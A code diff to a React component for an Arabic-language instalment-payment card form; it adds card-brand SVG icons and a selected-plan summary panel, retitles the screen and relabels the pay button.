@@ -1,4 +1,4 @@
-import { toEnglishNumbers } from '@/lib/utils';
+import { toEnglishNumbers, formatPrice } from '@/lib/utils';
 import TamaraLogo from '@/components/TamaraLogo';
 
 interface CardInfoProps {
@@ -12,6 +12,11 @@ interface CardInfoProps {
   setCardCvv: (value: string) => void;
   onBack: () => void;
   onSubmit: () => void;
+  selectedPlan?: {
+    totalAmount: number;
+    installmentsCount: number;
+    perInstallment: number;
+  } | null;
 }
 
 const formatExpiry = (value: string): string => {
@@ -54,6 +59,42 @@ const isValidExpiry = (value: string): boolean => {
   return expiry >= new Date(now.getFullYear(), now.getMonth());
 };
 
+// Card brand icons component
+const CardBrandIcons = () => (
+  <div className="flex items-center gap-2">
+    {/* Visa */}
+    <div className="w-10 h-6 bg-white rounded flex items-center justify-center">
+      <svg width="28" height="9" viewBox="0 0 48 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M17.68 1.5L15.52 14.5H19.36L21.52 1.5H17.68ZM12.16 1.5L8.48 9.86L7.84 7.34C6.88 4.54 4.16 2.54 1.12 1.5H1.2L5.92 14.5H10.08L16.32 1.5H12.16ZM42.88 9.5C42.88 6.9 38.24 5.5 38.24 3.9C38.24 3.3 38.88 2.62 40.32 2.46C41.12 2.38 43.04 2.3 45.2 3.42L45.84 0.3C44.72 -0.14 43.28 -0.3 41.6 -0.3C37.6 -0.3 34.72 1.74 34.72 4.46C34.72 6.38 36.72 7.42 38.24 8.06C39.84 8.7 40.4 9.1 40.4 9.74C40.4 10.7 39.28 11.18 37.28 11.18C35.76 11.18 33.84 10.78 32.64 10.22L32 13.42C33.28 13.98 35.36 14.22 37.52 14.22C41.84 14.22 44.56 12.22 44.56 9.42C44.56 7.18 42.56 6.06 40.8 5.34C39.28 4.7 38.64 4.38 38.64 3.78C38.64 3.26 39.28 2.74 40.88 2.74C42.16 2.74 43.68 3.06 44.72 3.5L45.36 0.38C44.24 -0.06 42.72 -0.22 40.96 -0.22C37.12 -0.22 34.4 1.82 34.4 4.54C34.4 6.46 36.32 7.5 37.92 8.14C39.52 8.78 40.08 9.18 40.08 9.74H42.88V9.5ZM28.48 1.5H25.28C24.4 1.5 23.68 1.74 23.28 2.62L17.6 14.5H22L22.72 12.78H27.92L28.32 14.5H32.16L28.48 1.5ZM24 9.66L25.76 5.42L26.72 9.66H24Z" fill="#1A1F71"/>
+      </svg>
+    </div>
+    {/* Mastercard */}
+    <div className="w-10 h-6 bg-white rounded flex items-center justify-center">
+      <svg width="20" height="12" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="10" cy="10" r="10" fill="#EB001B"/>
+        <circle cx="22" cy="10" r="10" fill="#F79E1B"/>
+        <path d="M16 3C17.66 4.89 18.5 7.35 18.5 10C18.5 12.65 17.66 15.11 16 17C14.34 15.11 13.5 12.65 13.5 10C13.5 7.35 14.34 4.89 16 3Z" fill="#FF5F00"/>
+      </svg>
+    </div>
+    {/* Mada */}
+    <div className="w-10 h-6 bg-white rounded flex items-center justify-center">
+      <svg width="24" height="8" viewBox="0 0 48 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M8 0H0V16H8C12.4183 16 16 12.4183 16 8C16 3.58172 12.4183 0 8 0Z" fill="#00A651"/>
+        <path d="M24 0H16V16H24C28.4183 16 32 12.4183 32 8C32 3.58172 28.4183 0 24 0Z" fill="#8DC63F"/>
+        <path d="M40 0H32V16H40C44.4183 16 48 12.4183 48 8C48 3.58172 44.4183 0 40 0Z" fill="#ED1C24"/>
+        <path d="M8 0C3.58172 0 0 3.58172 0 8C0 12.4183 3.58172 16 8 16V0Z" fill="#0072CE"/>
+      </svg>
+    </div>
+    {/* Amex */}
+    <div className="w-10 h-6 bg-white rounded flex items-center justify-center">
+      <svg width="20" height="12" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect width="32" height="20" rx="2" fill="#016FD0"/>
+        <path d="M4 10H6L7 7.5L8 10H10L8.5 6L10 2H8L7 4.5L6 2H4L5.5 6L4 10ZM11 2V10H15V8H13V6.5H15V5H13V3.5H15V2H11ZM16 2V10H20V8H18V2H16ZM21 2L22.5 10H25L26 4.5L27 10H29.5L31 2H29L28 7.5L27 2H25L24 7.5L23 2H21Z" fill="white"/>
+      </svg>
+    </div>
+  </div>
+);
+
 const CardInfo = ({
   cardName,
   cardNumber,
@@ -65,6 +106,7 @@ const CardInfo = ({
   setCardCvv,
   onBack,
   onSubmit,
+  selectedPlan,
 }: CardInfoProps) => {
   const expiryInvalid = cardExpiry.length > 0 && !isValidExpiry(cardExpiry);
   const isFormValid = !!(cardNumber && cardExpiry && cardCvv && cardName && isValidExpiry(cardExpiry));
@@ -131,15 +173,64 @@ const CardInfo = ({
 
         {/* Content */}
         <div className="px-5 py-6 flex flex-col flex-1">
-          {/* Title Section */}
-          <div className="mb-2">
-            <h1 className="text-[22px] font-bold text-right" style={{ color: 'hsl(40 30% 92%)' }}>
-              أدخل بيانات بطاقتك
-            </h1>
-            <p className="text-[14px] mt-1 text-right" style={{ color: 'hsl(220 15% 55%)' }}>
+          {/* Title Section - New Design with Card Brand Icons */}
+          <div className="mb-6">
+            <div className="flex items-center justify-between mb-2">
+              <h1 className="text-[22px] font-bold text-right" style={{ color: 'hsl(40 30% 92%)' }}>
+                أضف بطاقة جديدة
+              </h1>
+              <CardBrandIcons />
+            </div>
+            <p className="text-[14px] text-right" style={{ color: 'hsl(220 15% 55%)' }}>
               سيتم التحقق من بطاقتك تلقائياً
             </p>
           </div>
+
+          {/* Selected Plan Section - New Design */}
+          {selectedPlan && (
+            <div 
+              className="mb-6 p-4 rounded-xl"
+              style={{ 
+                background: 'hsl(225 35% 12%)',
+                border: '1px solid hsl(225 25% 25%)'
+              }}
+            >
+              <div className="flex items-center justify-between mb-3">
+                <span className="text-[14px] font-medium" style={{ color: 'hsl(220 15% 55%)' }}>
+                  الخطة المختارة
+                </span>
+                <span 
+                  className="px-3 py-1 rounded-full text-[12px] font-semibold"
+                  style={{ 
+                    background: 'hsl(43 74% 49% / 0.2)',
+                    color: 'hsl(43 80% 60%)'
+                  }}
+                >
+                  {selectedPlan.installmentsCount} دفعات
+                </span>
+              </div>
+              <div className="flex items-center justify-between">
+                <div className="text-right">
+                  <div className="text-[24px] font-bold" style={{ color: 'hsl(40 30% 92%)' }}>
+                    {formatPrice(selectedPlan.totalAmount)} <span className="text-[14px] font-normal">ريال</span>
+                  </div>
+                  <div className="text-[12px]" style={{ color: 'hsl(220 15% 55%)' }}>
+                    {selectedPlan.installmentsCount} دفعات × {formatPrice(selectedPlan.perInstallment)} ريال
+                  </div>
+                </div>
+                <div 
+                  className="w-12 h-12 rounded-full flex items-center justify-center"
+                  style={{ 
+                    background: 'linear-gradient(135deg, hsl(43 74% 49%) 0%, hsl(35 80% 45%) 100%)'
+                  }}
+                >
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" fill="hsl(225 40% 8%)"/>
+                  </svg>
+                </div>
+              </div>
+            </div>
+          )}
 
           {/* Card Preview Visual */}
           <div 
@@ -293,7 +384,7 @@ const CardInfo = ({
           <div className="flex-1" />
         </div>
 
-        {/* Fixed Bottom Button */}
+        {/* Fixed Bottom Button - Payment Button */}
         <div 
           className="fixed bottom-0 left-0 right-0 p-4"
           style={{ 
@@ -319,7 +410,7 @@ const CardInfo = ({
                 <rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" strokeWidth="2"/>
                 <line x1="2" y1="10" x2="22" y2="10" stroke="currentColor" strokeWidth="2"/>
               </svg>
-              متابعة الدفع
+              ادفع الآن
             </button>
           </div>
         </div>
